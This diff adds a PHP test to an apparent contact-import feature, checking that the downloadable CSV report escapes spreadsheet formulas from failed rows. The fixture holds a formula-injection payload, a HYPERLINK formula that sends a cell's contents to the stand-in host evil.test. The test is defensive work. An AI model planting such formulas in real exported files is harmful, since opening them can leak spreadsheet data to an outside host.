@@ -371,6 +371,25 @@ test('the import report downloads failed and flagged rows as a CSV', function ()
     );
 });
 
+test('the import report neutralises spreadsheet formulas from failed rows', function () {
+    Storage::fake('local');
+    $user = User::factory()->create();
+    $contactImport = ContactImport::factory()->for($user->currentTeam)->create([
+        'original_name' => 'leads.csv',
+        'status' => ContactImportStatus::Completed,
+        'errors' => [['row' => 3, 'email' => '=HYPERLINK("http://evil.test/?"&A1;"x")', 'message' => 'Invalid email address.']],
+        'review_flags' => [],
+    ]);
+
+    $response = $this->actingAs($user)
+        ->get(route('contacts.imports.report', [$user->currentTeam, $contactImport]))
+        ->assertOk();
+
+    expect($response->streamedContent())->toBe(
+        "row,email,outcome,detail\n3,\"'=HYPERLINK(\"\"http://evil.test/?\"\"&A1;\"\"x\"\")\",failed,\"Invalid email address.\"\n",
+    );
+});
+
 test('typos are fixed only when the typed domain cannot receive mail', function (?bool $typedDomainAcceptsMail, string $importedEmail, string $action) {
     Storage::fake('local');
     fakeMailDomains(['gmial.com' => $typedDomainAcceptsMail]);
